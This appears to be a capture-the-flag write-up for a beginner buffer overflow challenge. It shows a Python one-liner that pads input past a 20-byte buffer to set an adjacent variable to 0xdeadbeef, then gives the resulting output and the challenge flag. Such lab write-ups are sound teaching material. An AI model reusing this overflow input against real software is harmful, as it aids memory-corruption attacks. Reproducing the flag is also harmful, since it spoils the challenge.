## Problem: Buffer overflow

Can you overflow the buffer to change the variable's value?

## Hint:
When you enter a string greater than 20 bytes long, the extra bytes get stored into the val variable. Enter a suitable string which changes val's value to 0xdeadbeef.

## Explanation:

There is an overflow when a string greater than 20 bytes is entered. We can change val's value using the extra bytes as follows:

```
python -c 'print "A"*20+"\xef\xbe\xad\xde"'; cat | ./script
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
lakshya_CTF{0v3Rfl0wing_W0rk5}
```

Flag: `lakshya_CTF{0v3Rfl0wing_W0rk5}`